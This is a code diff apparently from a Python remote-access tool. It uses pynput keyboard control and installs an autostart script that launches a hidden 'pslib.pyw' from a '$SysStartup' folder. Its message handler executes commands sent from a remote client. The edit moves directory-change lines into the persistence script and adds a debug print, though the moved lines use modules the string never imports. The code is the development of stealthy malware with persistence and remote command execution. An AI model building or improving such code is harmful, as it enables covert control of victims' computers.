@@ -3,10 +3,9 @@ from subprocess import check_output, call
 from time import sleep
 from sys import exit
 from random import randint
-from os import getlogin, chdir
+from os import getlogin
 from os.path import exists
 import threading
-import pathlib
 
 try:
     import pynput
@@ -31,13 +30,14 @@ keyboard = Controller()
 # the script for autostart
 var = """import threading
 from subprocess import call
+import os
+path = (pathlib.Path(__file__).parent.absolute())
+chdir(path)
 def a0001(): call(["python", "C:\$SysStartup\pslib.pyw"], shell=True)
 a0001 = threading.Thread(target=a0001)
 a0001.start()
 
 """
-path = (pathlib.Path(__file__).parent.absolute())
-chdir(path)
 global client
 
 
@@ -78,6 +78,7 @@ def recvMsg():
 try:
     # processes the commands if sent
     def process(message):
+        print(message)
         message = message.replace("\\\\", "\\")
         ctype = message[0]
         # if console command is sent
